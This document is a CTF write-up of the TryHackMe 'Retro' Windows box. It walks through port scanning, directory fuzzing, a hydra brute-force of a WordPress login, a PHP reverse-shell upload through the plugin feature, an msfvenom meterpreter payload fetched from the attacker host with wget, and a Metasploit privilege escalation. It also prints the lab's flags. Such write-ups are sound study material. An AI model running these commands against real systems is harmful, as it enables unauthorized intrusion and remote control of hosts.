---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/retro/","tags":["CTF","write-up","windows"]}
---

---
# Active reconnaisance
## Enum ports and services
Start with an general scan to all ports
```shell
sudo nmap -n -vvv -sS --min-rate 5000 -Pn --open -p- 10.10.152.12
```

```
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 125
3389/tcp open  ms-wbt-server syn-ack ttl 125
```

Focused scan
```shell
sudo nmap -sCV -p 80,3389 10.10.152.12 -Pn
```

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2024-08-27T01:19:27+00:00
|_ssl-date: 2024-08-27T01:19:28+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2024-08-25T23:30:40
|_Not valid after:  2025-02-24T23:30:40
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## OS
Windows; CPE: cpe:/o:microsoft:windows


---
# Vuln analisis
## Port 80
```
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
```
![Pasted image 20240826202656.png](/img/user/attachments/Pasted%20image%2020240826202656.png)
## Port 3389
```
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2024-08-27T01:19:27+00:00
|_ssl-date: 2024-08-27T01:19:28+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2024-08-25T23:30:40
|_Not valid after:  2025-02-24T23:30:40
```



---
# Exploitation
## Usernames
Wade
Note from Wade
Leaving myself a note here just in case I forget how to spell it: parzival
## Fuzzing

> [!check]- A web server is running on the target. What is the hidden directory which the website lives on?
> retro

We have to fuzzing the webpage
```shell
wfuzz -c -t 100 --hc=404,403 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u 10.10.152.12/FUZZ
```
We found the directory
![Pasted image 20240826205132.png](/img/user/attachments/Pasted%20image%2020240826205132.png)
![Pasted image 20240826205227.png|400](/img/user/attachments/Pasted%20image%2020240826205227.png)
## retro Fanatics
### Enum
Wordpress 5.2.1
PHP 7.1.29
### Fuzzing
Apply fuzzing under `retro`
```shell
wfuzz -c -t 1000 --hc=404,403 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u 10.10.152.12/retro/FUZZ
```
![Pasted image 20240826205916.png|500](/img/user/attachments/Pasted%20image%2020240826205916.png)
wp-content is empty
wp-includes is Forbidden
![Pasted image 20240826210220.png|400](/img/user/attachments/Pasted%20image%2020240826210220.png)
### /wp-admin
![Pasted image 20240826221723.png](/img/user/attachments/Pasted%20image%2020240826221723.png)
Redirect to
### retro/index.php/author/wade
We found a directory to posible fuzz the usernames
![Pasted image 20240916172006.png|400](/img/user/attachments/Pasted%20image%2020240916172006.png)
Fuzzing to find  other usernames
```shell
sudo wfuzz -c -t 20 --hc=404,503 -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u 10.10.84.106/retro/index.php/author/FUZZ
```
FAIL

### Check notes
![Pasted image 20240916172217.png|400](/img/user/attachments/Pasted%20image%2020240916172217.png)

---
### /retro/wp-login.php
![Pasted image 20240826221913.png|400](/img/user/attachments/Pasted%20image%2020240826221913.png)
#### Usernames
Wade
From the retro subdir we have an username to test
![Pasted image 20240915091934.png|400](/img/user/attachments/Pasted%20image%2020240915091934.png)
#### Brute force
The username exists
![Pasted image 20240915092058.png|200](/img/user/attachments/Pasted%20image%2020240915092058.png)
Trying to get the password with the username "Wade", FAIL
```shell
hydra -l Wade -P /usr/share/wordlists/rockyou.txt 10.10.84.106 http-post-form "/retro/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect" -vV -t 20 -f
```
Testing "Wade" and "parzival" and works.
## Admin dashboard
We are in the admin dashboard
![Pasted image 20240917090106.png|500](/img/user/attachments/Pasted%20image%2020240917090106.png)
### Information
Email: darkstar@darkstar7471.com

Search vulnerabilities for 5.2.1 version
![Pasted image 20240917102210.png|500](/img/user/attachments/Pasted%20image%2020240917102210.png)
Vuln Description
- WordPress allows high privileged users (Admin / Super Admin on Mulsitite) to upload PHP files directly via the plugin/theme upload feature.
### File upload vulnerability
1. Go to  Plugins
2. Add new
3. Upload Plugin
4. Browser
5. Select  the revershell `php` file (https://www.revshells.com/ php Ivan)
   ![Pasted image 20240917102826.png|600](/img/user/attachments/Pasted%20image%2020240917102826.png)
6. Press  `install now`
   The  instalation fails  but the file has been uploaded
7. Set the listener on the attacker machine e.g. `rlwrap nc -lnvp 4747`
8. Go to the file  dir,  in this case `10.10.178.252/retro/wp-content/uploads/2024/09/rev_shell_3.php` and we have a revershell
   ![Pasted image 20240917103710.png|500](/img/user/attachments/Pasted%20image%2020240917103710.png)
## Login rdp
From attacker machine use the credentials to connect.
```powershell
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.50.105 /u:Wade /p:'parzival'
```
On the desktop we found the flag.
> [!check]- user.txt
> 3b99fbdc6d430bfb51c72c651a261927
# Privilege Escalation
## CVE-2019-1388 (FAIL)
If we open chrome, we see a CVE page saved as a bookmark
![Pasted image 20240919170922.png|400](/img/user/attachments/Pasted%20image%2020240919170922.png)
We search information and try to exploit it
A file `hhupd.exe` it is  on the recycle bin and we restore it to the desktop
Right click on it and run  as administrator. and Follow the steps.
![Pasted image 20240918131244.png|300](/img/user/attachments/Pasted%20image%2020240918131244.png)
![Pasted image 20240918131326.png|300](/img/user/attachments/Pasted%20image%2020240918131326.png)
![Pasted image 20240918131357.png|300](/img/user/attachments/Pasted%20image%2020240918131357.png)
![Pasted image 20240918131436.png|300](/img/user/attachments/Pasted%20image%2020240918131436.png)
On this point we have a intended bug acording to some sources, so in this point the exploit can't continue and we well try another vector.
## Revershell like Wade (FAIL)
Before we got a low privileges shell like the user `iis apppool\retro`
Now we will get a shell like Wade with higher privs.
Create the `exe` file 
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.2.59 LPORT=4848 -f exe > rev_shell.exe
```

On the attacker machine mount a python server to pass the file
```python
python3 -m http.server 4545
```
On the victim machine (rdp session). Open powershell and execute to  get the file
```shell
wget http://10.6.2.59:4545/rev_shell.exe -O rev_shell.exe
```
![Pasted image 20240919172722.png](/img/user/attachments/Pasted%20image%2020240919172722.png)

On the attacker machine again open `msfconsole`
and set the handler
![Pasted image 20240919172912.png|600](/img/user/attachments/Pasted%20image%2020240919172912.png)
And set the payload
```shell
set payload windows/meterpreter/reverse_tcp
```
And run `run`

On the victim machine execute the revshell file
![Pasted image 20240919173127.png](/img/user/attachments/Pasted%20image%2020240919173127.png)

And we have a  shell like Wade
![Pasted image 20240919173248.png|700](/img/user/attachments/Pasted%20image%2020240919173248.png)

Now run the privescalation module `run multi/recon/local_exploit_suggester`
![Pasted image 20240919173423.png|400](/img/user/attachments/Pasted%20image%2020240919173423.png)
And we have a long list of possible ways to escalate, I just show 1 of them.
![Pasted image 20240919174219.png](/img/user/attachments/Pasted%20image%2020240919174219.png)
Press ctrl + z to send the session to background, pres `y` and `enter`
To check it `session` it is the session 13
![Pasted image 20240919175828.png](/img/user/attachments/Pasted%20image%2020240919175828.png)

Use the exploit `use exploit/windows/local/ms16_075_reflection_juicy`
Set the `lport`, `lhost` and `session` 
When we try to execute `exploit` we have an advise, `Wade` doesn't have the `SeImpersonate` privilege.
![Pasted image 20240919180731.png](/img/user/attachments/Pasted%20image%2020240919180731.png)
![Pasted image 20240919181157.png](/img/user/attachments/Pasted%20image%2020240919181157.png)
So, we can try executing the exploit using a session like `iis apppool\retro` because the user have it
## Reverse shell like `iis apppoolretro`
To get this shell we just need exec the `.exe`file  when we was with a `php` reverse shell. After setting the `handler` as the pass step like `Wade`

Check the privileges. `whoami /priv`
![Pasted image 20240919180950.png|500](/img/user/attachments/Pasted%20image%2020240919180950.png)

Again send the session to background and set the options like above.
And execute `exploit`
![Pasted image 20240919181618.png](/img/user/attachments/Pasted%20image%2020240919181618.png)
And we have a shell with high privileges.
Get the root flag
![Pasted image 20240919181854.png|500](/img/user/attachments/Pasted%20image%2020240919181854.png)
> [!check]- root.txt.txt
> 7958b569565d7bd88d10c6f22d1c4063

---